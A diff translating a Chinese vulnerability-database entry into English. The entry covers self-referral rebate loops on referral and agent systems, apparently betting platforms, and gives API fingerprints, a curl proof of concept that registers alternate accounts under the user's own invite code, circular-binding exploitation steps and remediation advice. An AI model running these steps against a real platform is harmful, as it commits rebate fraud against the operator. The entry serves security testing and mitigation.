@@ -1,59 +1,59 @@
 ﻿---
-title: 邀请返水自邀循环（小号矩阵刷返水）
-cve: 无（业务逻辑）
+title: Self-referral rebate loops (alternate-account networks farming rebates)
+cve: None (business logic)
 severity: high
 cvss: 8.0
-product: 自研代理/邀请体系
-versions: 任意
+product: Custom agent/referral system
+versions: Any
 ports: 80, 443
-keywords: 邀请, 返水, 代理, 自邀, 循环, 佣金
-entry: /api/user/invite 或注册时的 inviteCode
+keywords: invitations, rebates, agents, self-referral, loops, commissions
+entry: /api/user/invite or inviteCode during registration
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 POST /api/user/register   {"inviteCode":"XXXX"}
-GET  /api/agent/team      → 返回下线列表与流水
+GET  /api/agent/team      → returns downline list and transactions
 GET  /api/agent/commission
 ```
 
-## 前置条件
+## Prerequisites
 
-- 一个账号；注册支持邀请码；返水按流水比例结算。
+- One account; registration supports invitation codes; rebates are calculated as a proportion of turnover.
 
 ## PoC
 
 ```bash
-# 1) 取自己的邀请码
+# 1) Obtain your own invitation code
 curl -s https://target/api/user/invite -H "Authorization: Bearer <t>" | jq '.data.code'
 
-# 2) 用小号注册并绑定自己（同 IP/同设备先试，若能过就说明风控缺失）
+# 2) Register alternate accounts and bind them to yourself (try the same IP/device first; acceptance indicates missing risk controls)
 for i in 1 2 3; do
   curl -s -X POST https://target/api/user/register \
     -H 'Content-Type: application/json' \
-    -d "{\"phone\":\"1390000000$i\",\"password\":\"Passw0rd!\",\"inviteCode\":\"<自己的码>\"}"
+    -d "{\"phone\":\"1390000000$i\",\"password\":\"Passw0rd!\",\"inviteCode\":\"<your-code>\"}"
 done
 
-# 3) 小号下注产生流水 → 主号查返水
+# 3) Generate turnover by betting with alternate accounts → check rebates on the main account
 curl -s https://target/api/agent/commission -H "Authorization: Bearer <t>" | jq
-# 判定：返水随小号流水增长 = 命中
+# Result: rebates grow with alternate-account turnover = confirmed
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先确认"能否自邀"（同 IP、同一设备指纹）；
-2. 小号做最小流水，看返水是否到账（这一步别放大）；
-3. 试循环绑（A 邀 B，B 邀 A）与代理层级（下线再邀下线）看是否重复计佣；
-4. 证据：邀请关系图 + 返水流水。
+1. First confirm whether self-referral is possible (same IP, same device fingerprint);
+2. Generate minimum turnover with an alternate account and check whether rebates arrive (do not scale this step);
+3. Try circular binding (A invites B, B invites A) and agent hierarchies (downlines invite further downlines) to check for duplicate commission;
+4. Evidence: referral relationship diagram + rebate transactions.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 注册风控：同 IP/设备/支付方式限制；禁止自邀（邀请人与被邀人身份交叉校验）。
-- 返水只对"净输"计佣，且加提现前置审核。
+- Registration risk controls: restrictions by IP/device/payment method; prohibit self-referral (cross-check inviter and invitee identities).
+- Calculate rebates only on "net losses" and add pre-withdrawal review.
 
-## 参考
+## References
 
 - OWASP WSTG-BUSL-02；CWE-840。
